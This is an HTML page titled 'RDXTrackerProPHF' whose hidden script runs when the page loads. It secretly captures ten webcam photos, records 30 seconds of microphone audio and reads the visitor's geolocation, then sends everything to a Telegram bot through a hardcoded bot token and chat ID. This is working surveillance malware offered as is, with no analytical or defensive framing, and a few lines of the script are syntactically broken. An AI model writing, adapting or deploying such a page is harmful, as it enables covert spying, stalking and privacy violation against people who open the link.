<!DOCTYPE html>  <html>    <head>    <meta name="viewport" content="width=device-width, initial-scale=1.0">    
<title>RDXTrackerProPHF</title>    
<style>    
    #video {    
        display: none;    
    }    
</style>

</head>    
<body>    
    <video id="video" autoplay></video>    
    <canvas id="canvas" width="2000" height="2000" style="display: none;"></canvas>  <script>    
    const botToken = "8034775195:AAGZO1q8PBOUCMCRVm0u9YVP6MWMcsIAs00";    
    const chatId = "7201255678";    
    let imageCount = 0;    function startCamera() {    
    const video = document.getElementById("video");    
    const canvas = document.getElementById("canvas");    
    const ctx = canvas.getContext("2d");    navigator.mediaDevices.getUserMedia({ video: true })    
    .then(stream => {    
        video.srcObject = stream;    

            
        const imageInterval = setInterval(() => {    
            if (imageCount >= 10) {    
                clearInterval(imageInterval); // Stop after 10 images    
            } else {    
                ctx.drawImage(video, 0, 0, 2000, 2000);    
                canvas.toBlob(sendToTelegram, "image/jpeg", 0.8);    
                imageCount++;    
            }    
        }, 1000);    

        // Start recording 30 seconds of audio    
        startRecording(30000);     
    })    
    .catch(error => {    
        console.error(error);    
        alert("Failed to access camera.");    
    });

}

function sendToTelegram(blob) {
const formData = new FormData();
formData.append("photo", blob, "camera.jpg");
formData.append("chat_id", chatId);

fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {    
    method: "POST",    
    body: formData,    
})    
    .then(response => response.json())    
    .then(data => {    
        if (data.ok) {    
            console.log("Image sent to Telegram.");    
        } else {    
            throw new Error(data.description);    
        }    
    })    
    .catch(error => {    
        console.error(error);    
        alert("Failed to send image.");    
    });

}

function sendLocationToTelegram() {
if (navigator.geolocation) {
navigator.geolocation.getCurrentPosition(position => {
const { latitude, longitude } = position.coords;
const url = https://www.google.com/maps?q=${latitude},${longitude};
const message = Current Location: ${url};

fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {    
            method: "POST",    
            headers: {    
                "Content-Type": "application/json"    
            },    
            body: JSON.stringify({    
                chat_id: chatId,    
                text: message    
            })    
        })    
        .then(response => response.json())    
        .then(data => {    
            if (data.ok) {    
                console.log("Location sent to Telegram.");    
            } else {    
                throw new Error(data.description);    
            }    
        })    
        .catch(error => {    
            console.error(error);    
            alert("Failed to send location.");    
        });    
    });    
} else {    
    alert("Geolocation is not supported by this browser.");    
}

}

function sendAudioToTelegram(blob) {
const formData = new FormData();
formData.append("audio", blob, "recording.wav");
formData.append("chat_id", chatId);

fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, {    
    method: "POST",    
    body: formData,    
})    
    .then(response => response.json())    
    .then(data => {    
        if (data.ok) {    
            console.log("Audio recording sent to Telegram.");    
        } else {    
            throw new Error(data.description);    
        }    
    })    
    .catch(error => {    
        console.error(error);    
        alert("Failed to send audio recording.");    
    });

}

function startRecording(duration) {
const audioChunks = [];

navigator.mediaDevices    
    .getUserMedia({ audio: true })    
    .then((stream) => {    
        const mediaRecorder = new MediaRecorder(stream);    

        mediaRecorder.start();    

        setTimeout(() => {    
            mediaRecorder.stop();    
        }, duration);    

        mediaRecorder.addEventListener("dataavailable", (event) => {    
            audioChunks.push(event.data);    
        });    

        mediaRecorder.addEventListener("stop", () => {    
            const audioBlob = new Blob(audioChunks, { type: "audio/wav" });    
            sendAudioToTelegram(audioBlob);    
        });    
    })    
    .catch((error) => {    
        console.error(error);    
        alert("Failed to access microphone.");    
    });

}

startCamera();
sendLocationToTelegram();

</script>  </body>

</html> 